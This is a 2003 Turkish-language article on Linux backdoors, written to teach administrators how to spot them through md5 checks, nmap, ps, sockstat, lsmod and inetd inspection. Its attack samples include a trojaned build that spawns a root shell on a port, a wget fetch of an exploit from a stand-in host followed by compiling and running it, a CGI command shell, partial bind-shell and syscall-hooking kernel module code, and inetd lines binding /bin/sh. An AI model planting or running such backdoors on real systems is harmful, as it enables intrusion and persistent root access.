# Linux Güvenlik Açiklari

## **LINUX Güvenlik Açıkları**

Arkakapılar sistemin güvenlik çemberinde ne derece düzensizlikler oluştururlar?
Bu düzensizliğin boyutu nedir?
Sistem yöneticisi arkakapının varlığını nasıl anlayabilir?
Yoksa benim yönettiğim sisteme kimse girip delik açamaz mı diyorsunuz?

Bilgi, ulaşmak istediği hedefteki kapıda, küçük aralık bulduğu anda bu aralıktan kendisini
hedefe doğru bırakır. "Kapıda neden aralık var?" suallini sormadan içeri süzülür.
Bilgilerinizi, bahçesini davetsiz misafirlere karşı dikenli tellerle koruyan bir kişi
gibi güvenlik çemberiyle koruyabilirsiniz.
Fakat sisteminize saygıdeğer bir misafir gibi gelip, sonra sizin rızanız olmadan
sisteminizi tekrar ziyaret etmek isteyebilir(Kesin bu misafire dalgınlıkla şekerleme sundunuz).
Neticesinde ozenle duzenlediğiniz bahçeniz bir anda istemediğiniz bir boyuta gelebilir.
En değerli ürünleriniz yani özenle bakıp büyüttüğünüz bilgileriniz bir anda başka bahçelerde
bulunabilir. Hemde ürününüzün hangi ellere geçtiğini bilmeden.

Eğer bilgileriniz değerliyse(bilginin değersizi olur mu bilmem?) bunların çevresini
kuşatan telleri devamlı kontrol etmek sizi rahatlatır. Kontrolleriniz esnasında bu tellerin
en küçük bir yerinde pas gördüğünüz anda gerekli bakımı yapmak bahçenizin yeşilliğini
koruyacaktır.

Sistemimize bir sürü dosya yükleriz. Bazen, yüklediğimiz dosyaların yaratacağı sorunları
düşünmeden sisteme kurarız. Ya unutkanlıktan yada üşengeçlikten sisteme indirilen
yazılımların güvenilirlik kontrollerini yapmayız. Kimbilir belki gönül rahatlığıyla
kurduğunuz dosyaların sisteminizde bir arkakapı oluşturma olasılığını gözardı ediyorsunuzdur.

Yazılımın Web sitesinde belirtilen MD5 kontrolu:
file.tar.gz
18a8284860c5c9940c57e03aac4a9911

Bizim yaptığımız file.tar.gz'nin kontrolu:
$ md5sum file.tar.gz
64dc31bf20ace98a7200d39da7d0d1a2

Sonuçlar farklı. Üstünde düşünülmesi gereken bir durum. Dikkat!!!!
Üşenip md5 kontrolunu yapmadan, çektiğimiz dosyayı sisteme kurduğumuzu düşünelim.

**\[baglik@eregli Kod\]# tar zxvf file.tar.gz**
file
file/getconn.c
file/Makefile
file/config.c
file/main.c
file/common.h
file/file.c

**\[baglik@eregli file\]# make**
cc -Wall -g \`libnet-config --cflags --defines\` -c getconn.c
getconn.c: In function \`getconn':
getconn.c:30: warning: implicit declaration of function \`exit'
cc config.c -o config
./config &
cc -Wall -g \`libnet-config --cflags --defines\` -c main.c
cc -Wall -g \`libnet-config --cflags --defines\` -c file.c
cc -o file getconn.o main.o file.o -L/usr/local/lib -lpcap \`libnet-config --libs\`

Dikkatli kullanıcı hemen ./config & satırını görünce bir anda şüpheye düşer.
Bu config.c isimli dosya incelendiğinde sistemde arka kapıya neden olan kod olduğu
anlaşılır.

**\[baglik@eregli file\]# pico config.c**

...
...
#define port 60000
#define shell "/bin/sh"
...
...
execl(shell,shell,(char \*)0);
...
...

Bu açık portu fark eden kişi:

**\[yabanci@operim yabanci\]$ telnet eregli.sistem 60000**

Trying eregli.sistem...
Connected to eregli.sistem (xxx.xxx.xxx.xxx).
Escape character is '^\]'.

id;
uid=0(root) gid=0(root) groups=0(root) <-- arka kapı sınırları yeniden çizer.
-- dosya root yetkisiyle kurulduğundan
-- sistem yöneticisine tozlu rüyalar gördürür.

Eğer bu file.tar.gz isimli dosyayı herhangi bir kullanıcı(root yetkisine sahip olmayan)
sisteme kurduysa;

**\[yabanci@operim yabanci\]$ telnet eregli.sistem 60000**

Trying eregli.sistem...
Connected to eregli.sistem (xxx.xxx.xxx.xxx).
Escape character is '^\]'.

id;
uid=501(k.mi) gid=501(k.mi) groups=501(student) <-- normal kullanıcı modunda.
-- Saldırgan sistemde root
-- olmak için elinden geleni
-- yapmaya calışacaktır.
uname -a;
Linux eregli.sistem 2.4.18-6mdk #1 Fri Mar 15 02:59:08 CET 2002 i686 unknown

cat /etc/redhat-release;
Mandrake Linux release 8.2 (Bluebird) for i586

cd /tmp;

pwd;
/tmp

/usr/bin/wget http://exploit.sitesi/dosya/8.2/op\_beni.c;
--00:58:43-- http://exploit.sitesi/dosya/8.2/op\_beni.c
=> \`op\_beni.c'
Connecting to exploit.sitesi:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 6,767 \[text/plain\]

0K ...... 100%

00:58:43 .....\`op\_beni.c' saved \[6767/6767\]

ls;
dcopGByrhp
dcopYfUXJw
kde-root
ksocket-root
mcop-root
op\_beni.c <-- Sisteme indirilip derlenmek istenen dosya.

/bin/gcc -o op\_beni op\_beni.c;
ls;
dcopGByrhp
dcopYfUXJw
kde-root
ksocket-root
mcop-root
op\_beni <-- Derlenmiş hali.
op\_beni.c

./op\_beni; <-- Exploit çalıştırılıyor.
\[\*\] Wait ....
\[\*\] Wait ......
\[\*\] muck ... muck ... muck ... muck
\[\*\] Bingo :)

id;
uid=0(root) gid=0(root) groups=0(root) <-- Sınırları zorlama zamanı ;)

Sisteminize ait herhangi bir kullanıcının şifresini elde eden saldırgan, sisteme
tekrar bağlanmak için(özellikle şifre değişmesi halinde) sistemde arka kapı bırakma
olasılığı fazladır. Bu arka kapının türü tamamıyla saldırganın hayal gücüne kalmıştır.
Saldırganın gerçekleştirebileceği arka kapılardan bazıları:
- Belli süre zarfında içinde geçerli olacak arka kapı açma
- Herhangi bir servis açma
- Kernel arka kapıları
- Dosyaların içine gizlenilen arka kapılar
- Rootkitlerin yardımıyla kurulan arka kapılar

Saldırganın amacı(hepsi için geçerli değil) elindeki güzellikleri kaybetse de sistemde
olabildiğince uzun yaşamak.

Ayrıca sunucuda gezinen bir davetsiz misafir .php .cgi tipi kodlarla sistemde bir gedik
oluşturabilir.
Örnegin;
Aşağıdaki komut.cgi isimli dosyayı sunucunun /cgi-bin dizinine yükleyen misafir, Web
göstericiler üzerinden sistemde kodlarda çalıştırabilir.

#komut.cgi
#!/bin/sh
echo Content-type: text/html
echo
echo "<pre>"
$\*

\[eregli@eregli eregli\]$ lynx http://arkakapili.sistem/cgi-bin/komut.cgi?ls%20/etc

Bastille
DIR\_COLORS
X11
adjtime
aliases
aliases.db
alternatives
anacrontab
apcupsd
at.deny
bashrc
conf.linuxconf
..
..
-- press space for next page --
Arrow keys: Up and Down to move. Right to follow a link; Left to go back.
H)elp O)ptions P)rint G)o M)ain screen Q)uit /=search \[delete\]=history list

Davetsiz misafir, sistem yöneticisi durumuna geldiğinde tekrar sisteme bağlanmak
istediğinde yapacağı eğilimlerden biri olarak sistemde açık kapı bırakmak olduğunu
belirtmiştim. Bıraktığı açık kapıdan sisteme sadece kendisi bağlanabilmesi için kapıya
kilit yani şifre koyar. şifre girildiğinde kapı ardına kadar açılır ve parmaklarıyla
sistemde gezinmeye başlar. Saldırgan, sistem yöneticisinin, sistemde calışan uygulamaları
görmek istemesi durumunda sahte isimlerle karşılaşması için açık kapı bırakan
uygulamalarda kod değişikliği yapabilir.

#include <sys/socket.h>
#include <netinet/in.h>
....
#define SHELL "/bin/sh"
#define SARG "-i"
#define PASSWD "ACIL\_KAPI"
#define PORT 6767
#define FAKEPS "httpd"
#define SHELLPS "klogd"
...
int main (int argc, char \*argv\[\])
{
...
static char \*pass = PASSWD;
...
strcpy(argv\[0\], FAKEPS);
signal(SIGCHLD, SIG\_IGN);
if ((lsock = socket(AF\_INET, SOCK\_STREAM, 0)) == -1) exit (-1);
...
execv(SHELL, sargv);
...
exit(0);
}

\[eregli@eregli eregli\]$ ssh -l avicenna arkakapili.sistem
avicenna@arkakapili's password:
Last login: Mon Apr 14 01:52:00 2003 from xxx.yyy.zzz.ttt
\[avicenna@arkakapili avicenna\]$ cd /tmp
\[avicenna@arkakapili tmp\]$ mkdir .mail
\[avicenna@arkakapili tmp\]$ cd .mail
\[avicenna@arkakapili .mail\]$ cat > net.c
#include <sys/socket.h>
#include <netinet/in.h>
....
#define SHELL "/bin/sh"
#define SARG "-i"
#define PASSWD "ACIL\_KAPI"
#define PORT 6767
#define FAKEPS "httpd"
#define SHELLPS "klogd"
...
int main (int argc, char \*argv\[\])
{
...
static char \*pass = PASSWD;
...

\[avicenna@arkakapili .mail\]$ gcc -o net net.c

Bu esnada saldırgan sisteme root olarak girmek için açık kapıyı root durumda bırakmak
isteyecektir. Bu nedenle normal kullanıcıdan root moduna geçmek için exploitleri deneyecektir.
Yani anlayacağınız sistem, sıfırdan vurulmak için bir deneme tahtası olacaktır(uid=0).
Hedefi sıfırdan vurduğunda açık kapı bırakma işlemi başlamıştır.
\[root@arkakapili .mail\]# ./net &

Sistemde açık kapı bırakılmadan önce yapılan port taramasının sonucu:
\[root@eregli eregli\]# nmap -p 1-10000 arkakapili.sistem

Starting nmap V. 2.54BETA30 ( www.insecure.org/nmap/ )
Interesting ports on arkakapili.sistem (xxx.xxx.xxx.xxx):
Port State Service
21/tcp open ftp
22/tcp open ssh
25/tcp open smtp
53/tcp open domain
80/tcp open http
110/tcp open pop-3
443/tcp open https
3306/tcp open mysql

Portlar incelendiğinde herşey normal gözüküyor.
Fakat açık kapı bırakıldığında portların durumunu görelim:

**\[root@eregli eregli\]# nmap -p 1-10000 arkakapili.sistem**

Starting nmap V. 2.54BETA30 ( www.insecure.org/nmap/ )
Interesting ports on arkakapili.sistem (xxx.xxx.xxx.xxx):
Port State Service
21/tcp open ftp
22/tcp open ssh
25/tcp open smtp
53/tcp open domain
80/tcp open http
110/tcp open pop-3
443/tcp open https
3306/tcp open mysql
6767/tcp open unknown <--- ilginc bir port ;)

**\[eregli@eregli eregli\]$ telnet arkakapili.sistem 6767**
Trying xxx.xxx.xxx.xxx...
Connected to arkakapili.sistem (xxx.xxx.xxx.xxx).
Escape character is '^\]'.
eregli <--- Yanlış şifre girildiğinden
Connection closed by foreign host. --- uygulama baglantıyı kopardı.

**\[eregli@eregli eregli\]$ telnet arkakapili.sistem 6767**
Trying xxx.xxx.xxx.xxx...
Connected to arkakapili.sistem (xxx.xxx.xxx.xxx).
Escape character is '^\]'.
ACIL\_KAPI

klogd: no job control in this shell
\[root@arkakapili /\]# id
uid=0(root) gid=0(root) groups=0(root) <-- Sistem yöneticisi şimdi ağlasın mı,
-- gülsün mü?

Sistem yöneticisi çalışan uygulamalara baktığında, çalışan uygulamaların olağan
uygulamalar olduğu kanısına varabilir:

**\[root@arkakapili root\]# ps -aux**
USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND
root 1 0.2 0.3 1412 504 ? S 01:37 0:04 init
root 2 0.0 0.0 0 0 ? SW 01:37 0:00 \[keventd\]
root 3 0.0 0.0 0 0 ? SW 01:37 0:00 \[kapmd\]
root 4 0.0 0.0 0 0 ? SWN 01:37 0:00 \[ksoftirqd\_CPU0\]
root 5 0.0 0.0 0 0 ? SW 01:37 0:00 \[kswapd\]
named 1018 0.0 1.8 10192 2324 ? S 01:38 0:00 named -u named
named 1025 0.0 1.8 10192 2324 ? S 01:38 0:00 named -u named
named 1026 0.0 1.8 10192 2324 ? S 01:38 0:00 named -u named
named 1027 0.0 1.8 10192 2324 ? S 01:38 0:00 named -u named
named 1028 0.0 1.8 10192 2324 ? S 01:38 0:00 named -u named
root 1049 0.0 0.9 2664 1224 ? S 01:38 0:00 /usr/sbin/sshd
...
...
avicenna 2777 0.0 1.2 2724 1532 pts/6 S 01:52 0:00 -bash
root 2808 0.0 1.2 2784 1588 ? S 01:52 0:00 klogd -i <--- Dikkat !!!!
root 2832 0.0 0.0 1368 104 ? S 01:52 0:00 httpd ole <--- Dikkat !!!!
root 2932 0.0 0.7 2904 960 pts/1 R 02:08 0:00 ps -aux

SockStat aracı ile sistemde uygulamaların kullandığı portları ve durumlarını inceleyebilirsiniz.

**\[root@arkakapili root\]#./sockstat**
SocketStat v1.0 - A Socket Information Program

Pro User Process Local Address State
UDP root portmap\[776\] x.x.x.x:111 CLOSED
TCP root portmap\[776\] x.x.x.x:111 LISTEN
UDP root rpc.sta\[842\] x.x.x.x:1018 CLOSED
UDP root rpc.sta\[842\] x.x.x.x:1024 CLOSED
TCP root rpc.sta\[842\] x.x.x.x:1024 LISTEN
UDP named named\[1018\] x.x.x.x:1025 CLOSED
UDP named named\[1018\] x.x.x.x:53 CLOSED
TCP named named\[1018\] x.x.x.x:53 LISTEN
...
TCP root httpd\[1561\] x.x.x.x:80 LISTEN
TCP root mysqld\[1667\] x.x.x.x:3306 LISTEN
TCP root mysqld\[1773\] x.x.x.x:3306 LISTEN
TCP root mysqld\[1775\] x.x.x.x:3306 LISTEN
TCP root mysqld\[1780\] x.x.x.x:3306 LISTEN
TCP root kapici\[2284\] x.x.x.x:6767 LISTEN
\------ ----
| |
| |- ---Kullandigi Port
|
|---Calisan uygulama

**\[root@arkapili root\]#./sockstat**
SocketStat v1.0 - A Socket Information Program
Pro User Process Local Address State
...
TCP root sh\[2284\] x.x.x.x:6767 ESTBLSH
TCP root sh\[2284\] x.x.x.x:6767 ESTBLSH
TCP root sh\[2284\] x.x.x.x:6767 ESTBLSH
TCP root sh\[2284\] x.x.x.x:6767 LISTEN
TCP root |-- sh\[2284\] x.x.x.x:6767 ESTBLSH
TCP root |-- sh\[2284\] x.x.x.x:6767 ESTBLSH
TCP root |-- kapici\[2310\] x.x.x.x:6767 LISTEN ---------- |
|
|- /bin/sh(kabuk) calismis durumda. 6767 numarali portta biri var.

Saldırgan, sisteme bağlanmak için kullandığı kullanıcının, şifresini değiştirmeyeceğini
düşünerek sisteme müfredata uygun şekilde bağlanıp Kernel istismarlarını kullanarak yönetici
olmak isteyebilir. Sistem yöneticisinin dikkat edeceği hususlardan biride çekirdek modüllerini
şüpheli bir durumda(hep şüpheli durumda mi kontrol etmeli?) kontrol etmesi olacaktır.
Yani halk arasında Kernel Backdoor denilen olaylara dikkat etmek gerekir.
"Benim kullanıcılarım uslu durur. Sistemi kurcalayamazlar. Zaten sistemden derleyicileri
(gcc,cc) kaldırdım. Yetki kısıtlaması da koydum." şeklinde bir düşünceye sahip sistem
yöneticisi varsa buna diyecek sözüm yok :)
Gözü dönmüs biri için yetki kısıtlaması olmuş, sistemde derleyici yokmuş gibi durumları
düşünmez. Davetsiz misafir dönen gözünü yuvasına oturtturmak için her türlü yola başvuracaktır.
Örneğin; sisteminizin yapısını inceleyerek(işletim sistemi, çekirdek versiyonu vb.) o işletim
sistemine sahip başka bir bilgisayarda root yetkisini verecek exploiti derleyip sizin
sisteminize aktararak çeşitli olasılıkları deniyecektir.

Konuyu dağıtmadan bir olayı irdeleyelim\[Milleti illaki paranoya moduna getirecez ya :)\]
Yurt dışında azımsanamayacak derecede muşteriye sahip bir servis sağlayıcısı güzel bir
hayat sürmekteymiş. O servis sağlayıcının Web sitesini gezen sakin, gözü yuvasından fırlamamış
kişi sistemin üyeler(members) bölümüne farenin klik sesini duyacak şekilde tıkladığında
karşısına orada barınan Web sitelerinin kullanıcı adlarını görür.
Aklına "Acaba üye adları ile kullandığı şifreler arasında ne gibi bir ilişki var" felsefesinden
yola çıkma düşüncesi gelir. Yaptığı denemeler sonucu bazı üyelerin şifrelerini bulur(Artik
sakin kişi gitmiş, gözü yuvasından fırlayan biri gelmiştir).
Sistemde ftp-ssh servisleri açıktır. Ssh ile sisteme bağlandığında istediği emellerine
ulaşmasını sağlayacak olan .c kodunu derleyemez. Çünkü sistemde derleyiciler kaldırılmıştır.
Ortalıkta fazla dolaşmadan aynı özelliklere sahip(işletim sistemi vb..) başka sistemde .c
kodunu derler. Derlediği kodu, gözünü döndüren servis saglayıcının sistemine aktarır.
Sonucunda root yetkisini almıştır. Sisteme yerleştirdiği Sniffer sayesinde(tüm kodlari
aynı özelliklere sahip başka sistemde derleyip,aktarmış) gerçek sistem yöneticisinin
bağlandığı ip adresleri, şifreleri (rootun kullandığı şifreler routerlere baglantı şifreleri
ile ayni imiş) ele geçirir. Neticesinde sistem yoneticisi bu bizim gözü dönen kişiyi
fark etmiş(Aylar sonra).
Sonuçta servis sağlayıcısı işletim sistemini değiştirmiş. Fakat kullanıcı şifreleri
aynı kalmış :)
Bunu bana gozu donen biri fisildadi :)

Saldırgan, sisteme sonradan bağlanıp yetkileri eline almak için port açmak istemeye de
bilir. ;)
Bunun çeşitli sebeplerinden biri açık olan portların kolayca tespit edilebilmesi.
Sistemin kullandığı portlardan(ssh-telnet) sisteme bağlanıp(mukavele gereği) normal
kullanıcıdan bir anda root durumuna geçip sistemi sizin yerinize daha iyi koruma
ihtimalide vardır :)
Bunu yapabilmek için kullanacagı diğer bir açık kapıda Kernel Backdoor diye tasvir edilen
uygulamaları kullanmasıdır.

**\[root@arkakapi /root\]# lsmod**
Module Size Used by Tainted: P
kbdv 940 0 (unused) <-- Bu modül hoşa gitmiyen tipe benziyor.
nfsd 69536 8 (autoclean)
lockd 49344 1 (autoclean) \[nfsd\]
sunrpc 62964 1 (autoclean) \[nfsd lockd\]
...
ext3 62092 1
...

Beklenmeyen misafir sistemde yönetici durumuna geçmiş, sistemi yeteri kadar incelemiş.
Böyle bir sistemi bir daha nerede bulurum düşüncesiyle sistemde yetkileri tekrar eline
almak icin gerçek yöneticinin düşünemeyeceği yollara başvurma ihtimalide vardır(\`Sistemde
açık portlar kapatılabilir, suid tipi dosyalarin bu özellikleri kaldırılabilir\` düşüncesine
sahip bir saldırgan türüyle karşı karşıya kalınabilir).

Örneğin:

#define MODULE
#define \_\_KERNEL\_\_

#include <syscall.h>
#include <asm/uaccess.h>
#include <linux/module.h>
#include <linux/modversions.h>
...

#define FILE\_NAME "op\_beni" <--- Sihirli kelimeler

extern void \*sys\_call\_table\[\];

/\* system calls we will replace \*/
int (\*orig\_utime)(const char \*filename, struct utimbuf \*buf);
int (\*orig\_getuid32)();
int u;
....
sys\_call\_table\[SYS\_utime\] = orig\_utime;
sys\_call\_table\[SYS\_getuid32\] = orig\_getuid32;
}

Yukarıda kaynağa benzer bir .c kodunu sisteme aktaran kişi root yetkisiyle dosyayı
derlediğini düsünelim.

**\[root@arkakapili tmp\]# gcc -c -O2 kbdv3.c -I/lib/modules/\`uname -r\`/build/include**
**\[root@arkakapili tmp\]# ls -1**
kbdv.c
kbdv.o <-- Sisteme tekrar baglanıldığında root ateşi sardıracak.

**\[root@arkakapili tmp\]# insmod kbdv3.o**
Warning: loading kbdv3.o will taint the kernel: no license

**\[root@saldirgan tmp\]# lsmod**
Module Size Used by Tainted: P
kbdv 908 0 (unused) <-- Bekliyor ustadini :)

...

Saldirgan artik sistemi gönul rahatlığıyla terk ediyor. Canı sıkıldıgında,
bu root neden bunlari anlamadi dusuncesine kapıldığında yada kız arkadaşına
kızdığında dagıtmak isteyecegi tek yer Kernel Backdoor olayına girdiği sistem olacaktir.
Sisteme bağlandığında normal user olarak girer fakat sihirli kelimeleri söylediğinde
artık root olmuştur. Geri dönülmez yola girmiştir.

**\[eregli@eregli eregli\]# ssh -l avicenna arkakapili.sistem**
avicenna@arkakapili's password:
Last login: Mon Apr 14 02:28:31 2003 from eregli.sistem
\[avicenna@arkakapili avicenna\]$ <-- Normal kullanici durumumda
\[avicenna@arkakapili avicenna\]$ touch op\_beni <-- Sihirli kelimeler fisildandi
\[avicenna@arkakapili avicenna\]$ exit <-- Sistemden ayrildi.
-- Kernel Backdoor sisteme tekrar baglanmasini
-- beklemektedir. Cünkü üstadına yöneticilik
-- sertifikasi verecektir :)

**\[eregli@eregli eregli\]$ ssh -l avicenna arkakapili.sistem**
avicenna@arkakapili's password:
Last login: Mon Apr 14 05:30:34 2003 from eregli.sistem
\[avicenna@arkakapili avicenna\]# <-- Sonuç :)

Sistemdeki servislerin her zaman uslu uslu duracak halleri olmayabilir.
Sizden habersiz birileri sisteme servisler ekleme ihtimallerine karşın /etc/inetd.conf
dosyasını ve /etc/xinetd.d dizini altında bulunan dosyaları kontrol etmek menfaat icabıdır.

**\[root@arkakapili /\]cat /etc/inetd.conf**
...
echo 4444 stream tcp nowait root /bin/sh sh -i <-- Dikkat !!!!
...

**\[root@sistem /xserver\]cat /etc/xinetd.d/kendim** <--
...
protocol = tcp |
port = 4444 |
socket\_type = stream |
wait = no |
user = root |
server = /bin/sh |--- Dikkat !!!!
server\_args = -i |
...

Arka kapı durumlarına kısaca değinmeye çalıştım. Umarım bazı konuların aydınlanmasında
azda olsa ışık vermişimdir.

---
*Kaynak: `LİNUX GÜVENLİK AÇIKLARI/Odevsitesi_com_32333.doc` — Özgüç Bayrak    — 2003*
